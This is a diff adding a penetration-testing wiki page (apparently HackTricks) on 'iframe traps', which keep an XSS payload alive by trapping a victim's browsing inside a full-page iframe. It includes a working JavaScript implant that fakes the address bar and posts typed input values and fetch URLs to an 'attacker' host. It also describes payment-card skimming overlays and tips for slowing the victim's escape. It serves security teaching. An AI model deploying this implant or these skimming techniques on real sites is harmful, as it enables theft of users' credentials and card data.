@@ -1,0 +1,117 @@
+# Iframe Traps
+
+{{#include ../banners/hacktricks-training.md}}
+
+## Basic Information
+
+This technique abuses **same-origin XSS** to keep code execution alive while the victim keeps browsing the application. The classic write-ups were published by TrustedSec [here](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) and [here](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).<sup>[[1]](#references)[[2]](#references)</sup>
+
+The idea is to land the victim on a page vulnerable to XSS and then **trap the rest of their navigation inside a full-page iframe**. If the victim keeps clicking links, submitting forms, and moving through the application **inside the frame**, the original attacker-controlled page stays alive in the top window and can keep collecting data.
+
+To make the illusion more realistic, the top page can **mirror the iframe path into the browser address bar** with `history.replaceState()` and update the visible UI so the victim believes they are just moving normally across the app.
+
+<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>
+
+<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>
+
+Once the user is trapped, the payload can observe **navigation**, **form submissions**, **typed credentials**, **XHR/fetch traffic**, and any **same-origin storage** available to the framed routes.
+
+The main limitation is still escape: if the victim **closes the tab**, **switches to another URL**, or reaches browser chrome actions that the page cannot suppress, the trap is over.
+
+## Practical requirements & limitations
+
+- The technique is strongest when the victim keeps browsing **same-origin** pages after the initial XSS. If the iframe navigates cross-origin, SOP kills direct DOM access.
+- `X-Frame-Options: SAMEORIGIN` and `Content-Security-Policy: frame-ancestors 'self'` do **not** stop a same-origin XSS from framing the application itself. `DENY` or `frame-ancestors 'none'` on sensitive routes does.
+- Modern SPAs often do not perform full page loads. If you only hook `load` and `click`, you will miss most interesting state changes.
+- Fullscreen is helpful for hiding browser chrome, but it still needs **user activation** and users can usually escape with browser/OS-controlled shortcuts.
+
+## Modernised trap (2024+)
+
+- Use a **full-viewport iframe** and keep the outer URL synchronized with `history.replaceState()`.
+- For SPA targets, hook **`fetch`**, **`XMLHttpRequest`**, **`pushState`/`replaceState`**, and **form events** inside the framed app.
+- Prefer a **top-level guard** so the payload does not recursively create new iframes every time the trapped application loads a route that also contains the implant.
+
+<details>
+<summary>Full-viewport iframe trap with SPA hooks</summary>
+
+```html
+<script>
+if (window.top === window.self) {
+  const trap = document.createElement('iframe');
+  trap.src = '/'; // or another same-origin route inside the application
+  trap.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:2147483647;background:#fff';
+  document.body.appendChild(trap);
+
+  const sync = u => {
+    const x = new URL(u, location.origin);
+    history.replaceState({}, '', x.pathname + x.search + x.hash);
+  };
+
+  trap.addEventListener('load', () => {
+    const w = trap.contentWindow;
+    const d = w.document;
+
+    ['click', 'submit', 'popstate', 'hashchange'].forEach(ev =>
+      w.addEventListener(ev, () => sync(w.location.href), true)
+    );
+
+    const oldFetch = w.fetch;
+    w.fetch = (...args) => {
+      fetch('//attacker/log', {method:'POST', body:'fetch=' + encodeURIComponent(args[0])});
+      return oldFetch.apply(w, args);
+    };
+
+    d.addEventListener('input', ev => {
+      if (!ev.target.name) return;
+      fetch('//attacker/keys', {
+        method: 'POST',
+        body: new URLSearchParams({
+          page: w.location.href,
+          name: ev.target.name,
+          value: ev.target.value
+        })
+      });
+    }, true);
+  });
+}
+</script>
+```
+</details>
+
+- `requestFullscreen({ navigationUI: 'hide' })` can make the fake chrome more convincing, but it only works after a user gesture and should be treated as a short-lived concealment aid, not as a reliable containment boundary.
+
+## Overlay & skimmer usage
+
+- Compromised checkout pages can **hide a legitimate hosted payment iframe and overlay it with a pixel-perfect fake collector** that forwards or replays data while the real payment flow still succeeds.<sup>[[4]](#references)</sup>
+- A more aggressive variant is to **rewrite the URL of the hosted-field iframe itself** so the browser loads an attacker-controlled frame that proxies the PSP flow and skims PAN/CVV inside the iframe context.<sup>[[4]](#references)</sup>
+- Trapping users in the top frame is also useful for collecting **autofill/password-manager** data before they notice the real browser URL never changed.
+
+## Recent chaining ideas
+
+- **POST-only reflected XSS** can be upgraded into a usable trap by landing the victim on the poisoned response with CSRF or an auto-submitting form, and then immediately switching into iframe-trap mode so the payload survives after the first POST response.<sup>[[3]](#references)</sup>
+- **`credentialless` iframe chains** can turn some self-XSS/login-CSRF scenarios into practical account-takeover paths without destroying the victim's live session.<sup>[[3]](#references)</sup> The full details are better covered in [Iframes in XSS, CSP and SOP](xss-cross-site-scripting/iframes-in-xss-and-csp.md).
+
+## Quick OPSEC tips
+
+- Re-focusing the iframe when the mouse leaves, disabling the context menu, and re-synchronizing the URL after each route change can slow down casual escape attempts.
+- Do **not** rely on blocking `Esc`, `F11`, `Ctrl+L`, tab switching, or other browser-owned shortcuts. Some keys may be interceptable in fullscreen/keyboard-lock flows, but browser escape paths generally still win.
+- If inline JavaScript is blocked by CSP, move the implant into a **same-origin external script**, another **same-origin child route**, or another **same-origin HTML gadget** you can frame. For more iframe/CSP-specific tricks, check [this page](xss-cross-site-scripting/iframes-in-xss-and-csp.md).
+
+## Related
+
+{{#ref}}
+clickjacking.md
+{{#endref}}
+
+{{#ref}}
+xss-cross-site-scripting/iframes-in-xss-and-csp.md
+{{#endref}}
+
+## References
+
+- [1] [Persisting XSS with iframe traps](https://trustedsec.com/blog/persisting-xss-with-iframe-traps)
+- [2] [JS-Tap: Weaponizing JavaScript for Red Teams](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams)
+- [3] [Make Self-XSS Great Again](https://blog.slonser.info/posts/make-self-xss-great-again/)
+- [4] [New Stealth Magecart Attack Bypasses Payment Services Using Iframes](https://www.humansecurity.com/learn/blog/new-stealth-magecart-attack-bypasses-payment-services-using-iframes/)
+
+{{#include ../banners/hacktricks-training.md}}
